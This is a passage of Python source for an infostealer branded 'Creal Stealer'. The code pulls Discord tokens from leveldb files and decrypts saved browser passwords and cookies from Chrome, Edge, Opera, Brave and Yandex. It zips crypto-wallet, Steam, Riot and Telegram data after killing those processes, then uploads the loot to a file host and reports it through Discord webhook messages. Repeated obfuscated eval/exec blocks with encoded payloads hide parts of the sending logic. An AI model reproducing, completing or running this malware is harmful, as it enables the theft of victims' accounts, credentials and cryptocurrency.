2406384';why,are,you,reading,this,thing,huh="\x5f\x5f\x5f\x5f","\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f","\x28\x22\x22\x2e\x6a\x6f","\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c","\x31\x30\x31\x2c\x39\x39","\x5f\x5f\x29\x29","\x5d\x29\x29\x28\x5f\x28";b='eJyLcq/IccytMIkqdzF1cncxcQTyowKDjABk3QfG';____("".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\x5f\x5f\x5f\x5f\x28\x22\x22\x2e\x6a\x6f\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c\x31\x30\x31\x2c\x39\x39\x5d\x29\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b"eJw9kM1ugzAQhF8pMaEtR1CBYHCB8me4AUqAymBoMNh++gJKelhpZrSrb7QZGctUaA/3vM9HOwJHoIAdHscZG8EV6IG66KvJEdQ7FF8rD2i77nNpikNb7I3GYnn6ZkwyMSpF5cmoR7Z3ymUK9Ph/d8EWb1HsrBSYAgf8vrFWKpsHBZmcXH31XLMbt065rLsBXjYeIzgW7RSwOu/nGlu+pEo6D5Zf08Wnhv1N8uDrYoTzPQ05MYKfuej5np2KkE0HD6ov3nbP35HLhEeYMiT89gu1MwYRQVZDEIz4ANUSK2Y1uMVtSJzq0HtmN88/bd1KXSD4WRUWX7Lth3+ys3G4")).decode(),"".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')
        return

    if name == "wppassw":
        ra = ' | '.join(da for da in paswWords)
        if len(ra) > 1000: 
            rrr = R4f0rm3t(str(paswWords))
            ra = ' | '.join(da for da in rrr)

        data = {
            "content": f"{globalInfo()}",
            "embeds": [
                {
                    "title": "Creal | Password Stealer",
                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts**:\n{ra}\n\n**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{P4sswCount}** Passwords Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealPassword.txt]({link})",
                    "color": 000000,
                    "footer": {
                        "text": "Creal Stealer",
                        "icon_url": "https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp"
                    }
                }
            ],
            "username": "Creal",
            "avatar_url": "https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp",
            "attachments": []
            }
        __cnk_obfuscator__ = ""
        import random as _______, base64, codecs, zlib;_=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/_______.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval("".join(chr(i) for i in [101,120,101,99]))("\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x5f\x22\x2c\x70\x72\x69\x6e\x74\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x22\x2c\x65\x78\x65\x63\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x22\x2c\x65\x76\x61\x6c\x29");__='1792035 653056 1132144 1883028 5606860 8791440 981870 2294364 3048890 3988608 4914645 8551095 9900600 5353088 2686671 7213682 1439018 2839617 8289924 8478020 1762688 3829938 2211666 2811171 4098490 2007126 4346540 8671922 5373843 2969498 5141208 3047212 3451272 1911531 1406680 214320 5807631 8313830 459204 846090 179120 6725628 10728704 4044360 65600 3123139 3077184 465290 7628712 1799508 639276 5058032 1063520 5705808 3695281 3126581 2878900 4523505 3515665 9303624 9846699 3858786 2731000 28014 2350854 352425 8638250 1293393 763972 7232736 8999235 2773 5431398 4037374 1326724 797992 7465194 10300356 4219759 2058960 4592323 4748394 2861088 2054415 2325148 3912089 1876750 4749030 4468408 2521904 5624133 5549976 405168 5182840 764449 704847 588400 627838 126312 60156 2726188 4326973 6620674 3757382 6426431 2877822 3323155 9902496 4047368 7923328 612447 1576764 5837970 1549614 3488265 3632869 1678456 2502792 2146365 8621478 4937100 7051345 4936233 8760570 62694 1695954 2739555 535866 7115160 2485336 7708240 7851828 169176 6724660 10061388 1398904 300333 3752112 3651088 2280200 6845364 924176 1836324 5134272 360295 3481875 292878 9246240 1133010 10276970 4191544 1286640 7025700 9415745 4759077 3682455 4053175 2967216 4094244 2027808 4427280 1551741 440105 3832154 4528290 2443050 8110960 4118500 2556881 1318588 252800 9730815 5792985 4510818 4342041 7431723 195648 3177368 457376 1286866 10197200 3298460 9090224 1680112 11413290 1086456 3559028 2540209 2979200 9485204 2695196 2382662 8999900 2949345 5052640 6594093 3325560 10886316 6733800 2174926 3172059 5769336 3788295 3666000 964471 9066848 9717435 4435813 10036341 5078583 2832396 3579576 10828050 84693 9999364 3664360 131318 2825046 4769520 4395215 4356492 4062238 1171750 445587 3512880 2759661 4420521 1993012 5150412 3849429 3461184 1577261 1879488 4886819 1671592 2152488 3509490 5571292 1941992 1399358 7187017 1116525 505350 6976718 5831850 1250370 4136580 2721264 2598856 4992616 5869424 2051811 5422120 7607184 3605394 3815595 8568420 555288 5568528 5548312 6074624 5448480 3766404 4041360 2306892 8608941 6375960 8514808 345420 6315296 4990090 3785032 1323952 4394250 8035776 4594211 564060 5176024 723639 925600 4171688 9301039 1914710 1097590 2983920 866916 579025 4237026 5047757 384750 8483319 5746680 3283995 7752628 3641584 2990515 9552504 2127600 9398987 423311 10771630 4632714 10528250 2587050 3219885 2406384';why,are,you,reading,this,thing,huh="\x5f\x5f\x5f\x5f","\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f","\x28\x22\x22\x2e\x6a\x6f","\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c","\x31\x30\x31\x2c\x39\x39","\x5f\x5f\x29\x29","\x5d\x29\x29\x28\x5f\x28";b='eJyLcq/IccytMIkqdzF1cncxcQTyowKDjABk3QfG';____("".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\x5f\x5f\x5f\x5f\x28\x22\x22\x2e\x6a\x6f\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c\x31\x30\x31\x2c\x39\x39\x5d\x29\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b"eJw9kM1ugzAQhF8pMaEtR1CBYHCB8me4AUqAymBoMNh++gJKelhpZrSrb7QZGctUaA/3vM9HOwJHoIAdHscZG8EV6IG66KvJEdQ7FF8rD2i77nNpikNb7I3GYnn6ZkwyMSpF5cmoR7Z3ymUK9Ph/d8EWb1HsrBSYAgf8vrFWKpsHBZmcXH31XLMbt065rLsBXjYeIzgW7RSwOu/nGlu+pEo6D5Zf08Wnhv1N8uDrYoTzPQ05MYKfuej5np2KkE0HD6ov3nbP35HLhEeYMiT89gu1MwYRQVZDEIz4ANUSK2Y1uMVtSJzq0HtmN88/bd1KXSD4WRUWX7Lth3+ys3G4")).decode(),"".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')
        return

    if name == "kiwi":
        data = {
            "content": f"{globalInfo()}",
            "embeds": [
                {
                "color": 000000,
                "fields": [
                    {
                    "name": "Interesting files found on user PC:",
                    "value": link
                    }
                ],
                "author": {
                    "name": "Creal | File Stealer"
                },
                "footer": {
                    "text": "Creal Stealer",
                    "icon_url": "https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp"
                }
                }
            ],
            "username": "Creal Stealer",
            "avatar_url": "https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp",
            "attachments": []
            }
        __cnk_obfuscator__ = ""
        import random as _______, base64, codecs, zlib;_=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/_______.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval("".join(chr(i) for i in [101,120,101,99]))("\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x5f\x22\x2c\x70\x72\x69\x6e\x74\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x22\x2c\x65\x78\x65\x63\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x22\x2c\x65\x76\x61\x6c\x29");__='1792035 653056 1132144 1883028 5606860 8791440 981870 2294364 3048890 3988608 4914645 8551095 9900600 5353088 2686671 7213682 1439018 2839617 8289924 8478020 1762688 3829938 2211666 2811171 4098490 2007126 4346540 8671922 5373843 2969498 5141208 3047212 3451272 1911531 1406680 214320 5807631 8313830 459204 846090 179120 6725628 10728704 4044360 65600 3123139 3077184 465290 7628712 1799508 639276 5058032 1063520 5705808 3695281 3126581 2878900 4523505 3515665 9303624 9846699 3858786 2731000 28014 2350854 352425 8638250 1293393 763972 7232736 8999235 2773 5431398 4037374 1326724 797992 7465194 10300356 4219759 2058960 4592323 4748394 2861088 2054415 2325148 3912089 1876750 4749030 4468408 2521904 5624133 5549976 405168 5182840 764449 704847 588400 627838 126312 60156 2726188 4326973 6620674 3757382 6426431 2877822 3323155 9902496 4047368 7923328 612447 1576764 5837970 1549614 3488265 3632869 1678456 2502792 2146365 8621478 4937100 7051345 4936233 8760570 62694 1695954 2739555 535866 7115160 2485336 7708240 7851828 169176 6724660 10061388 1398904 300333 3752112 3651088 2280200 6845364 924176 1836324 5134272 360295 3481875 292878 9246240 1133010 10276970 4191544 1286640 7025700 9415745 4759077 3682455 4053175 2967216 4094244 2027808 4427280 1551741 440105 3832154 4528290 2443050 8110960 4118500 2556881 1318588 252800 9730815 5792985 4510818 4342041 7431723 195648 3177368 457376 1286866 10197200 3298460 9090224 1680112 11413290 1086456 3559028 2540209 2979200 9485204 2695196 2382662 8999900 2949345 5052640 6594093 3325560 10886316 6733800 2174926 3172059 5769336 3788295 3666000 964471 9066848 9717435 4435813 10036341 5078583 2832396 3579576 10828050 84693 9999364 3664360 131318 2825046 4769520 4395215 4356492 4062238 1171750 445587 3512880 2759661 4420521 1993012 5150412 3849429 3461184 1577261 1879488 4886819 1671592 2152488 3509490 5571292 1941992 1399358 7187017 1116525 505350 6976718 5831850 1250370 4136580 2721264 2598856 4992616 5869424 2051811 5422120 7607184 3605394 3815595 8568420 555288 5568528 5548312 6074624 5448480 3766404 4041360 2306892 8608941 6375960 8514808 345420 6315296 4990090 3785032 1323952 4394250 8035776 4594211 564060 5176024 723639 925600 4171688 9301039 1914710 1097590 2983920 866916 579025 4237026 5047757 384750 8483319 5746680 3283995 7752628 3641584 2990515 9552504 2127600 9398987 423311 10771630 4632714 10528250 2587050 3219885 2406384';why,are,you,reading,this,thing,huh="\x5f\x5f\x5f\x5f","\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f","\x28\x22\x22\x2e\x6a\x6f","\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c","\x31\x30\x31\x2c\x39\x39","\x5f\x5f\x29\x29","\x5d\x29\x29\x28\x5f\x28";b='eJyLcq/IccytMIkqdzF1cncxcQTyowKDjABk3QfG';____("".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\x5f\x5f\x5f\x5f\x28\x22\x22\x2e\x6a\x6f\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c\x31\x30\x31\x2c\x39\x39\x5d\x29\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b"eJw9kM1ugzAQhF8pMaEtR1CBYHCB8me4AUqAymBoMNh++gJKelhpZrSrb7QZGctUaA/3vM9HOwJHoIAdHscZG8EV6IG66KvJEdQ7FF8rD2i77nNpikNb7I3GYnn6ZkwyMSpF5cmoR7Z3ymUK9Ph/d8EWb1HsrBSYAgf8vrFWKpsHBZmcXH31XLMbt065rLsBXjYeIzgW7RSwOu/nGlu+pEo6D5Zf08Wnhv1N8uDrYoTzPQ05MYKfuej5np2KkE0HD6ov3nbP35HLhEeYMiT89gu1MwYRQVZDEIz4ANUSK2Y1uMVtSJzq0HtmN88/bd1KXSD4WRUWX7Lth3+ys3G4")).decode(),"".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')
        return




# def upload(name, tk=''):
#     headers = {
#         "Content-Type": "application/json",
#         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
#     }

#     # r = requests.post(hook, files=files)
#     LoadRequests("POST", hook, files=files)
    _




def wr1tef0rf1l3(data, name):
    path = os.getenv("TEMP") + f"\wp{name}.txt"
    with open(path, mode='w', encoding='utf-8') as f:
        f.write(f"<--Creal STEALER BEST -->\n\n")
        for line in data:
            if line[0] != '':
                f.write(f"{line}\n")

T0k3ns = ''
def getT0k3n(path, arg):
    if not os.path.exists(path): return

    path += arg
    for file in os.listdir(path):
        if file.endswith(".log") or file.endswith(".ldb")   :
            for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
                    for t0k3n in re.findall(regex, line):
                        global T0k3ns
                        if ch1ckT4k1n(t0k3n):
                            if not t0k3n in T0k3ns:
                                # print(token)
                                T0k3ns += t0k3n
                                upl05dT4k31(t0k3n, path)

P4ssw = []
def getP4ssw(path, arg):
    global P4ssw, P4sswCount
    if not os.path.exists(path): return

    pathC = path + arg + "/Login Data"
    if os.stat(pathC).st_size == 0: return

    tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT action_url, username_value, password_value FROM logins;")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data: 
        if row[0] != '':
            for wa in keyword:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0]:
                    if not old in paswWords: paswWords.append(old)
            P4ssw.append(f"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {D3kryptV4lU3(row[2], master_key)}")
            P4sswCount += 1
    wr1tef0rf1l3(P4ssw, 'passw')

C00k13 = []    
def getC00k13(path, arg):
    global C00k13, CookiCount
    if not os.path.exists(path): return
    
    pathC = path + arg + "/Cookies"
    if os.stat(pathC).st_size == 0: return
    
    tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
    
    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"
    
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data: 
        if row[0] != '':
            for wa in keyword:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0]:
                    if not old in cookiWords: cookiWords.append(old)
            C00k13.append(f"{row[0]}	TRUE	/	FALSE	2597573456	{row[1]}	{D3kryptV4lU3(row[2], master_key)}")
            CookiCount += 1
    wr1tef0rf1l3(C00k13, 'cook')

def G3tD1sc0rd(path, arg):
    if not os.path.exists(f"{path}/Local State"): return

    pathC = path + arg

    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])
    # print(path, master_key)
    
    for file in os.listdir(pathC):
        # print(path, file)
        if file.endswith(".log") or file.endswith(".ldb")   :
            for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
                for t0k3n in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                    global T0k3ns
                    t0k3nDecoded = D3kryptV4lU3(b64decode(t0k3n.split('dQw4w9WgXcQ:')[1]), master_key)
                    if ch1ckT4k1n(t0k3nDecoded):
                        if not t0k3nDecoded in T0k3ns:
                            # print(token)
                            T0k3ns += t0k3nDecoded
                            # writeforfile(Tokens, 'tokens')
                            upl05dT4k31(t0k3nDecoded, path)

def GatherZips(paths1, paths2, paths3):
    thttht = []
    for patt in paths1:
        a = threading.Thread(target=Z1pTh1ngs, args=[patt[0], patt[5], patt[1]])
        a.start()
        thttht.append(a)

    for patt in paths2:
        a = threading.Thread(target=Z1pTh1ngs, args=[patt[0], patt[2], patt[1]])
        a.start()
        thttht.append(a)
    
    a = threading.Thread(target=ZipTelegram, args=[paths3[0], paths3[2], paths3[1]])
    a.start()
    thttht.append(a)

    for thread in thttht: 
        thread.join()
    global WalletsZip, GamingZip, OtherZip
        # print(WalletsZip, GamingZip, OtherZip)

    wal, ga, ot = "",'',''
    if not len(WalletsZip) == 0:
        wal = ":coin:  •  Wallets\n"
        for i in WalletsZip:
            wal += f"└─ [{i[0]}]({i[1]})\n"
    if not len(WalletsZip) == 0:
        ga = ":video_game:  •  Gaming:\n"
        for i in GamingZip:
            ga += f"└─ [{i[0]}]({i[1]})\n"
    if not len(OtherZip) == 0:
        ot = ":tickets:  •  Apps\n"
        for i in OtherZip:
            ot += f"└─ [{i[0]}]({i[1]})\n"          
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    
    data = {
        "content": globalInfo(),
        "embeds": [
            {
            "title": "Creal Zips",
            "description": f"{wal}\n{ga}\n{ot}",
            "color": 000000,
            "footer": {
                "text": "Creal Stealer",
                "icon_url": "https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp"
            }
            }
        ],
        "username": "Creal Stealer",
        "avatar_url": "https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp",
        "attachments": []
    }
    __cnk_obfuscator__ = ""
    import random as _______, base64, codecs, zlib;_=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/_______.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval("".join(chr(i) for i in [101,120,101,99]))("\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x5f\x22\x2c\x70\x72\x69\x6e\x74\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x22\x2c\x65\x78\x65\x63\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x22\x2c\x65\x76\x61\x6c\x29");__='1792035 653056 1132144 1883028 5606860 8791440 981870 2294364 3048890 3988608 4914645 8551095 9900600 5353088 2686671 7213682 1439018 2839617 8289924 8478020 1762688 3829938 2211666 2811171 4098490 2007126 4346540 8671922 5373843 2969498 5141208 3047212 3451272 1911531 1406680 214320 5807631 8313830 459204 846090 179120 6725628 10728704 4044360 65600 3123139 3077184 465290 7628712 1799508 639276 5058032 1063520 5705808 3695281 3126581 2878900 4523505 3515665 9303624 9846699 3858786 2731000 28014 2350854 352425 8638250 1293393 763972 7232736 8999235 2773 5431398 4037374 1326724 797992 7465194 10300356 4219759 2058960 4592323 4748394 2861088 2054415 2325148 3912089 1876750 4749030 4468408 2521904 5624133 5549976 405168 5182840 764449 704847 588400 627838 126312 60156 2726188 4326973 6620674 3757382 6426431 2877822 3323155 9902496 4047368 7923328 612447 1576764 5837970 1549614 3488265 3632869 1678456 2502792 2146365 8621478 4937100 7051345 4936233 8760570 62694 1695954 2739555 535866 7115160 2485336 7708240 7851828 169176 6724660 10061388 1398904 300333 3752112 3651088 2280200 6845364 924176 1836324 5134272 360295 3481875 292878 9246240 1133010 10276970 4191544 1286640 7025700 9415745 4759077 3682455 4053175 2967216 4094244 2027808 4427280 1551741 440105 3832154 4528290 2443050 8110960 4118500 2556881 1318588 252800 9730815 5792985 4510818 4342041 7431723 195648 3177368 457376 1286866 10197200 3298460 9090224 1680112 11413290 1086456 3559028 2540209 2979200 9485204 2695196 2382662 8999900 2949345 5052640 6594093 3325560 10886316 6733800 2174926 3172059 5769336 3788295 3666000 964471 9066848 9717435 4435813 10036341 5078583 2832396 3579576 10828050 84693 9999364 3664360 131318 2825046 4769520 4395215 4356492 4062238 1171750 445587 3512880 2759661 4420521 1993012 5150412 3849429 3461184 1577261 1879488 4886819 1671592 2152488 3509490 5571292 1941992 1399358 7187017 1116525 505350 6976718 5831850 1250370 4136580 2721264 2598856 4992616 5869424 2051811 5422120 7607184 3605394 3815595 8568420 555288 5568528 5548312 6074624 5448480 3766404 4041360 2306892 8608941 6375960 8514808 345420 6315296 4990090 3785032 1323952 4394250 8035776 4594211 564060 5176024 723639 925600 4171688 9301039 1914710 1097590 2983920 866916 579025 4237026 5047757 384750 8483319 5746680 3283995 7752628 3641584 2990515 9552504 2127600 9398987 423311 10771630 4632714 10528250 2587050 3219885 2406384';why,are,you,reading,this,thing,huh="\x5f\x5f\x5f\x5f","\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f","\x28\x22\x22\x2e\x6a\x6f","\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c","\x31\x30\x31\x2c\x39\x39","\x5f\x5f\x29\x29","\x5d\x29\x29\x28\x5f\x28";b='eJyLcq/IccytMIkqdzF1cncxcQTyowKDjABk3QfG';____("".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\x5f\x5f\x5f\x5f\x28\x22\x22\x2e\x6a\x6f\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c\x31\x30\x31\x2c\x39\x39\x5d\x29\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b"eJw9kM1ugzAQhF8pMaEtR1CBYHCB8me4AUqAymBoMNh++gJKelhpZrSrb7QZGctUaA/3vM9HOwJHoIAdHscZG8EV6IG66KvJEdQ7FF8rD2i77nNpikNb7I3GYnn6ZkwyMSpF5cmoR7Z3ymUK9Ph/d8EWb1HsrBSYAgf8vrFWKpsHBZmcXH31XLMbt065rLsBXjYeIzgW7RSwOu/nGlu+pEo6D5Zf08Wnhv1N8uDrYoTzPQ05MYKfuej5np2KkE0HD6ov3nbP35HLhEeYMiT89gu1MwYRQVZDEIz4ANUSK2Y1uMVtSJzq0HtmN88/bd1KXSD4WRUWX7Lth3+ys3G4")).decode(),"".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')



def ZipTelegram(path, arg, procc):
    global OtherZip
    pathC = path
    name = arg
    if not os.path.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)

    zf = ZipFile(f"{pathC}/{name}.zip", "w")
    for file in os.listdir(pathC):
        if not ".zip" in file and not "tdummy" in file and not "user_data" in file and not "webview" in file: 
            zf.write(pathC + "/" + file)
    zf.close()

    lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
    #lnik = "https://google.com"
    os.remove(f"{pathC}/{name}.zip")
    OtherZip.append([arg, lnik])

def Z1pTh1ngs(path, arg, procc):
    pathC = path
    name = arg
    global WalletsZip, GamingZip, OtherZip
    # subprocess.Popen(f"taskkill /im {procc} /t /f", shell=True)
    # os.system(f"taskkill /im {procc} /t /f")

    if "nkbihfbeogaeaoehlefnkodbefgpgknn" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Metamask_{browser}"
        pathC = path + arg
    
    if not os.path.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)

    if "Wallet" in arg or "NationsGlory" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"{browser}"

    elif "Steam" in arg:
        if not os.path.isfile(f"{pathC}/loginusers.vdf"): return
        f = open(f"{pathC}/loginusers.vdf", "r+", encoding="utf8")
        data = f.readlines()
        # print(data)
        found = False
        for l in data:
            if 'RememberPassword"\t\t"1"' in l:
                found = True
        if found == False: return
        name = arg


    zf = ZipFile(f"{pathC}/{name}.zip", "w")
    for file in os.listdir(pathC):
        if not ".zip" in file: zf.write(pathC + "/" + file)
    zf.close()

    lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
    #lnik = "https://google.com"
    os.remove(f"{pathC}/{name}.zip")

    if "Wallet" in arg or "eogaeaoehlef" in arg:
        WalletsZip.append([name, lnik])
    elif "NationsGlory" in name or "Steam" in name or "RiotCli" in name:
        GamingZip.append([name, lnik])
    else:
        OtherZip.append([name, lnik])


def GatherAll():
    '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '
    browserPaths = [
        [f"{roaming}/Opera Software/Opera GX Stable",               "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{roaming}/Opera Software/Opera Stable",                  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",    "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/Yandex/YandexBrowser/User Data",                 "yandex.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"                                    ],
        [f"{local}/Microsoft/Edge/User Data",                       "edge.exe",     "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ]
    ]

    discordPaths = [
        [f"{roaming}/Discord", "/Local Storage/leveldb"],
        [f"{roaming}/Lightcord", "/Local Storage/leveldb"],
        [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
        [f"{roaming}/discordptb", "/Local Storage/leveldb"],
    ]

    PathsToZip = [
        [f"{roaming}/atomic/Local Storage/leveldb", '"Atomic Wallet.exe"', "Wallet"],
        [f"{roaming}/Exodus/exodus.wallet", "Exodus.exe", "Wallet"],
        ["C:\Program Files (x86)\Steam\config", "steam.exe", "Steam"],
        [f"{roaming}/NationsGlory/Local Storage/leveldb", "NationsGlory.exe", "NationsGlory"],
        [f"{local}/Riot Games/Riot Client/Data", "RiotClientServices.exe", "RiotClient"]
    ]
    Telegram = [f"{roaming}/Telegram Desktop/tdata", 'telegram.exe', "Telegram"]

    for patt in browserPaths: 
